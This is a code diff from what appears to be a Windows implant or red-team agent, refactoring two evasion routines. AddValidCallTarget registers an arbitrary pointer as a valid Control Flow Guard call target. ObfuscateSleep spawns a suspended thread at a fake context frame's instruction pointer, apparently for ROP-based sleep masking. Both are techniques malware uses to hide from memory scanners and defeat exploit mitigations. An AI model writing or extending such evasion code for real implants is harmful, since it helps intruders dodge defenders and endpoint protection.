@@ -2,16 +2,15 @@
 
 BOOL AddValidCallTarget(void* pointer) {
 
-    PIMAGE_DOS_HEADER                dos_head    = { };
-    PIMAGE_NT_HEADERS                nt_head     = { };
-    CFG_CALL_TARGET_INFO             target_info = { };
-    EXTENDED_PROCESS_INFORMATION     ex_procinfo = { };
+    CFG_CALL_TARGET_INFO            target_info = { };
+    EXTENDED_PROCESS_INFORMATION    ex_procinfo = { };
 
-    size_t                           length      = 0;
-    bool                             success     = false;
+    bool    success = true;
+    auto    base    = Ctx->base.address;
+    size_t  length  = 0;
 
-    dos_head = DOS_HEADER(Ctx->base.address);
-    nt_head  = NT_HEADERS(Ctx->base.address, dos_head);
+    auto dos_head = DOS_HEADER(Ctx->base.address);
+    auto nt_head  = NT_HEADERS(Ctx->base.address, dos_head);
 
     length   = nt_head->OptionalHeader.SizeOfImage;
     length   = (length + 0x1000 - 1) &~ (0x1000 - 1);
@@ -19,14 +18,13 @@ BOOL AddValidCallTarget(void* pointer) {
     ex_procinfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
     ex_procinfo.ExtendedProcessInfoBuffer = 0;
 
-    if (NT_SUCCESS(ntstatus = Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) (ProcessCookie | ProcessUserModeIOPL), &ex_procinfo, sizeof(ex_procinfo ), nullptr))) {
-        target_info.Flags  = CFG_CALL_TARGET_VALID;
-        target_info.Offset = U_PTR(pointer) - U_PTR(Ctx->base.address);
+    x_ntassertb(ntstatus = Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) (ProcessCookie | ProcessUserModeIOPL), &ex_procinfo, sizeof(ex_procinfo), nullptr));
 
-        auto base = Ctx->base.address;
-        if (Ctx->nt.SetProcessValidCallTargets(NtCurrentProcess(), &base, length, 1, &target_info)) {
-            success_(true);
-        }
+    target_info.Flags  = CFG_CALL_TARGET_VALID;
+    target_info.Offset = U_PTR(pointer) - U_PTR(Ctx->base.address);
+
+    if (Ctx->nt.SetProcessValidCallTargets(NtCurrentProcess(), &base, length, 1, &target_info)) {
+        success_(true);
     }
 
     defer:
@@ -104,7 +102,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 
     if (
         !NT_SUCCESS(ntstatus = Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid)) ||
-        !NT_SUCCESS(ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( fake_frame->Rip ), NULL, TRUE, 0, 0xFFFF, 0xFFFF, NULL))) {
+        !NT_SUCCESS(ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PTHREAD_START_ROUTINE)fake_frame->Rip, nullptr, true, 0, 0xFFFF, 0xFFFF, nullptr))) {
         success_(false);
     }
 
